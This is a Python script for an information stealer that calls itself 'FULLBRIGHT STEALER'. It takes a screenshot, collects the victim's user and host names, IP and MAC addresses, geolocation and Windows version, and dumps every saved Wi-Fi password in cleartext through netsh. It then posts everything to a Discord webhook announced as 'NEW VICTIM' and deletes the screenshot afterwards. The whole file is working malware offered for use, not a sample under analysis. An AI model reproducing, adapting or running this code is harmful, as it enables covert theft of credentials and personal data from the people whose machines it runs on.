import os, pyautogui, requests, socket, datetime, json, psutil, platform, subprocess
from co.config import WEBHOOK_URL

def get_geolocation(ip):
    apis=[f"https://ipinfo.io/{ip}/json", f"https://ipapi.co/{ip}/json/", f"http://ip-api.com/json/{ip}"]
    for api in apis:
        try:
            response=requests.get(api,timeout=5)
            if response.status_code==200:
                data=response.json()
                if "city" in data and "region" in data and "country" in data:
                    return data.get("city","Unknown"),data.get("region","Unknown"),data.get("country","Unknown")
        except Exception: continue
    return "Unknown","Unknown","Unknown"

def get_wifi_info():
    wifi_info=[]
    try:
        profiles_output=subprocess.check_output("netsh wlan show profiles",shell=True,text=True)
        ssids=[]
        for line in profiles_output.split('\n'):
            if "All User Profile" in line:
                ssid=line.split(":")[1][1:].strip()
                ssids.append(ssid)
        for ssid in ssids:
            try:
                password_output=subprocess.check_output(f"netsh wlan show profile name=\"{ssid}\" key=clear",shell=True,text=True)
                password_found=False
                for pass_line in password_output.split('\n'):
                    if "Key Content" in pass_line:
                        password=pass_line.split(":")[1][1:].strip()
                        wifi_info.append(f"{ssid}:{password}")
                        password_found=True
                        break
                if not password_found:
                    wifi_info.append(f"{ssid}:NO PWD")
            except subprocess.CalledProcessError as e:
                wifi_info.append(f"{ssid}:Error retrieving password")
    except subprocess.CalledProcessError:
        return "Could not retrieve Wi-Fi profiles or insufficient permissions."
    except Exception as e:
        return f"An unexpected error occurred: {e}"
    return '\n'.join(wifi_info) if wifi_info else "No Wi-Fi information available."

def sendinfo():
    webhook_url=WEBHOOK_URL
    screenshot_path=os.path.join(os.getenv('APPDATA'),'screenshot.png')
    pyautogui.screenshot(screenshot_path)
    host_name=socket.gethostname()
    user_name=os.getlogin()
    ipv4=requests.get("https://api64.ipify.org").text
    try:
        ipv6=psutil.net_if_addrs()['Ethernet'][2].address if 'Ethernet' in psutil.net_if_addrs() else 'N/A'
    except(IndexError,KeyError): ipv6='N/A'
    try:
        mac_address=psutil.net_if_addrs()['Ethernet'][0].address if 'Ethernet' in psutil.net_if_addrs() else 'N/A'
    except(IndexError,KeyError): mac_address='N/A'
    try:
        private_ipv4=psutil.net_if_addrs()['Wi-Fi'][1].address if 'Wi-Fi' in psutil.net_if_addrs() else 'N/A'
    except(IndexError,KeyError): private_ipv4='N/A'
    windows_version=platform.version()
    local_time=datetime.datetime.now().strftime('%A, %B %d, %Y %I:%M:%S %p')
    cursor_position=pyautogui.position()
    location=get_geolocation(ipv4)
    initial_message={"content":f"||@everyone|| NEW VICTIM: {user_name}"}
    requests.post(webhook_url,json=initial_message)
    embed_screenshot={
        "embeds":[{
            "color":3447003,
            "author":{"name":"CLICK 2 JOIN RAYWZW's DISCORD","url":"https://discord.gg/aGpfgnW4aW"},
            "fields":[
                {"name":"👤 **PC User**","value":user_name,"inline":False},
                {"name":"🖥️ **PC Name**","value":host_name,"inline":False},
                {"name":"🪟 **Windows Version**","value":windows_version,"inline":False},
                {"name":"📅 **Local Date/Time**","value":local_time,"inline":False},
                {"name":"🌐 **IPv4**","value":ipv4,"inline":False},
                {"name":"🔍 **IPv6**","value":ipv6,"inline":False},
                {"name":"🔒 **MAC Address**","value":mac_address,"inline":False},
                {"name":"🔐 **Private IPv4**","value":private_ipv4,"inline":False},
                {"name":"📍 **Geolocation**","value":f"{location[0]},{location[1]},{location[2]}","inline":False},
                {"name":"🎯 **Cursor Position**","value":f"x:{cursor_position[0]},y:{cursor_position[1]}","inline":False}
            ],
            "image":{"url":"attachment://screenshot.png"},
            "footer":{"text":"FULLBRIGHT STEALER BY RAYWZW"}
        }]
    }
    wifi_info=get_wifi_info()
    embed_wifi={
        "embeds":[{
            "color":16711680,
            "author":{"name":"CLICK 2 JOIN RAYWZW's DISCORD","url":"https://discord.gg/aGpfgnW4aW"},
            "fields":[{"name":"📶 **Wi-Fi Info**","value":wifi_info,"inline":False}],
            "footer":{"text":"FULLBRIGHT STEALER BY RAYWZW"}
        }]
    }
    with open(screenshot_path,'rb') as file:
        files={'file':('screenshot.png',file)}
        response=requests.post(webhook_url,files=files,data={'payload_json':json.dumps(embed_screenshot)})
        if response.status_code==204:
            print("Screenshot sent successfully!")
        else:
            print(f"Failed to send screenshot. Status code: {response.status_code}")
    requests.post(webhook_url,json=embed_wifi)
    os.remove(screenshot_path)